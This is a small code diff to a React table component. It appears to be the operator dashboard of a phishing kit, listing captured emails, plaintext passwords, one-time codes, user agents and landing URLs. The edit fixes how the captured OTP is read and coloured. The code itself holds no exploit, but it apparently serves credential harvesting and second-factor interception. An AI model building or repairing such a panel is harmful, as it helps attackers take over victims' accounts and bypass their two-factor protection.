@@ -194,7 +194,7 @@ const Table = ({ currentItems, startIndex, onDelete, onOpenDeleteModal }) => (
               <td className="px-4 py-2 border border-gray-300">{user.email}</td>
               <td className="px-4 py-2 border border-gray-300">{user.password}</td>
               {/* <td className="px-4 py-2 border border-gray-300">{user.ip}</td> */}
-              <td className={`px-4 py-2 border border-gray-300 ${link?.otp ? "text-green-500" : "text-red-500"}`}>{link?.otp ? link?.otp : "N/A"}</td>
+              <td className={`px-4 py-2 border border-gray-300 ${user?.otp ? "text-green-500" : "text-red-500"}`}>{user?.otp ? user?.otp : "N/A"}</td>
               <td className="px-4 py-2 border border-gray-300">{user.userAgent}</td>
               <td className="px-4 py-2 border border-gray-300">{user.url?.split("?")[0]}</td>
               <td className="px-4 py-2 border border-gray-300">
